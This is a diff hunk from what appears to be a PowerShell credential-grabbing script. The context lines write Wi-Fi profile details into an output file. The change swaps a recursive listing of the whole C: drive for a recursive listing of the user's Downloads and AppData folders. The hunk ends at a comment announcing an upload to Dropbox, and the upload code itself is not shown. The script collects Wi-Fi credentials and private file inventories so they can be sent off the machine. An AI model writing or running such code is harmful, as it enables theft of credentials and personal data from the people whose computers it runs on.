@@ -18,12 +18,15 @@ foreach ($profile in $wifiProfiles) {
     Add-Content -Path $outputFile -Value "`nProfile: $profile`n$wifiDetails`n"
 }
 
-          REM tree list (fixing soon)
+REM grab file tree list of downloads and appdata
+         
+Add-Content -Path $outputFile -Value "`n===== file tree of downloads and appdata =====`n"
+Get-ChildItem -Path "$env:USERPROFILE\Downloads", "$env:USERPROFILE\AppData" -Recurse -Force | ForEach-Object {
+    $_.FullName
+} | Out-File -FilePath $outputFile -Append
 
-          Add-Content -Path $outputFile -Value "`n===== File Tree of C:\ =====`n"
-          Get-ChildItem -Path "C:\" -Recurse -Force | ForEach-Object {
-           $_.FullName
-           } | Out-File -FilePath $outputFile -Append
+
+
 
 REM Upload to Dropbox 
 
